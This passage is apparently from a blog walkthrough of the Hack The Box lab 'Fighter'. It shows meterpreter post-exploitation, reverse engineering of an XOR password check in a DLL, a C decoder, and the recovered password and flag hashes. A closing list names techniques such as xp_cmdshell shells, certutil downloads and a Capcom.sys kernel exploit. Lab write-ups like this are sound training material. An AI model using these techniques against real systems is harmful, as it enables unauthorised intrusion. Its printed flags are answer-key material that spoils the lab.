class="line"></span><br><span class="line">c:\Users\decoder\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line"><span class="built_in">type</span> user.txt</span><br><span class="line">bb6163c184f203af2a31a9c035934297</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb34.jpg"></li>
</ul>
<p>we got user.txt</p>
<p>We move into c:\users\Administrator\Desktop and find a file called “root.exe”. We run it and find that it asks for a password. There is also a DLL file called “checkdll.dll”, as the password might be checked using this DLL file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\Administrator\Desktop&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is BE85-B9AE</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">08/01/2018  21:44    &lt;DIR&gt;          .</span><br><span class="line">08/01/2018  21:44    &lt;DIR&gt;          ..</span><br><span class="line">24/10/2017  17:02             9.216 checkdll.dll</span><br><span class="line">08/01/2018  23:34             9.728 root.exe</span><br><span class="line">24/10/2017  21:06        13.767.776 vc_redist.x86.exe</span><br><span class="line">               3 File(s)     13.786.720 bytes</span><br><span class="line">               2 Dir(s)  23.804.547.072 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users\Administrator\Desktop&gt;root.exe</span><br><span class="line">root.exe</span><br><span class="line">root.exe &lt;password&gt;</span><br></pre></td></tr></table></figure>

<p>We download both the files into our system using meterpreter.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">cd</span> Users/Administrator/Desktop</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">C:\Users\Administrator\Desktop</span><br><span class="line">meterpreter &gt; download root.exe /root/hackthebox/fighter</span><br><span class="line">[*] Downloading: root.exe -&gt; /root/hackthebox/fighter/root.exe</span><br><span class="line">[*] Downloaded 9.50 KiB of 9.50 KiB (100.0%): root.exe -&gt; /root/hackthebox/fighter/root.exe</span><br><span class="line">[*] download   : root.exe -&gt; /root/hackthebox/fighter/root.exe</span><br><span class="line">meterpreter &gt; download checkdll.dll /root/hackthebox/fighter</span><br><span class="line">[*] Downloading: checkdll.dll -&gt; /root/hackthebox/fighter/checkdll.dll</span><br><span class="line">[*] Downloaded 9.00 KiB of 9.00 KiB (100.0%): checkdll.dll -&gt; /root/hackthebox/fighter/checkdll.dll</span><br><span class="line">[*] download   : checkdll.dll -&gt; /root/hackthebox/fighter/checkdll.dll</span><br></pre></td></tr></table></figure>

<p>reverse engineer them using IDA and find that this program XOR’s 9 with each character of the variable aFmFeholH. Now analyzing with IDA tells us that the variable contains “FmfEhO1}h”.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public check</span><br><span class="line">check proc near</span><br><span class="line"></span><br><span class="line">arg_0= dword ptr  8</span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">mov     edx, [ebp+arg_0]</span><br><span class="line">xor     eax, eax</span><br><span class="line">sub     edx, offset aFmFeholH ; <span class="string">&quot;Fm`fEhOl&#125;h&quot;</span></span><br><span class="line">xchg    ax, ax</span><br></pre></td></tr></table></figure>

<p>伪代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">signed int __cdecl check(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // eax</span><br><span class="line"></span><br><span class="line">  v1 = 0;</span><br><span class="line">  <span class="keyword">while</span> ( (*(_BYTE *)(a1 + v1) ^ 9) == aFmFeholH[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned int)++v1 &gt;= 0xA )</span><br><span class="line">      <span class="built_in">return</span> 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So we create a c program that XOR’s 9 with each character of the string.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fm`fEhOl&#125;h</span><br></pre></td></tr></table></figure>

<p>check.c</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">char aFmFeholH[15] = <span class="string">&quot;Fm`fEhOl&#125;h&quot;</span>;</span><br><span class="line">int v1;</span><br><span class="line">	<span class="keyword">for</span> (v1=0;v1&lt;11;v1++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(*(int *) (aFmFeholH + v1) ^ 9));</span><br><span class="line">	puts(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>compile and run the file and get the password to be “OdioLaFeta”.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># gcc check.c -o check</span></span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># ./check </span></span><br><span class="line">OdioLaFeta</span><br></pre></td></tr></table></figure>

<p>provide the password to the root.exe we get our final flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;root.exe OdioLaFeta</span><br><span class="line">root.exe OdioLaFeta</span><br><span class="line">d801c1e9bd9a02f8fb30d8bd3be314c1</span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb35.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb36.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb37.jpg"></p>
</li>
</ul>
<p>what a crazy box…</p>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>masscan quick port scan</li>
<li>burp intruder fuzz subdomains</li>
<li>sql injection python shell script</li>
<li>Construct xp_cmdshell statement to spawn a shell</li>
<li>use nps payload bypass a firewall</li>
<li>use “certutil.exe -urlcache -split -f” to download files</li>
<li>turn 32-bits session to 64-bits session</li>
<li>Street Fighter 5 - ‘Capcom.sys’ Kernel Execution (Metasploit)</li>
<li>modify metasploit module ruby scripts</li>
<li>reverse engineer .dll file then write .c decrypt program</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lucifer11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2020/06/03/fighter/" title="Hack-The-Box-walkthrough[fighter]">https://fdlucifer.github.io/2020/06/03/fighter/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/05/23/evm/" rel="prev" title="vulnhub-walkthrough[EVM-1]">
                  <i class="fa fa-chevron-left"></i> vulnhub-walkthrough[EVM-1]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/06/05/blunder/" rel="next" title="Hack-The-Box-walkthrough[blunder]">
                  Hack-The-Box-walkthrough[blunder] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">643k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:57</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
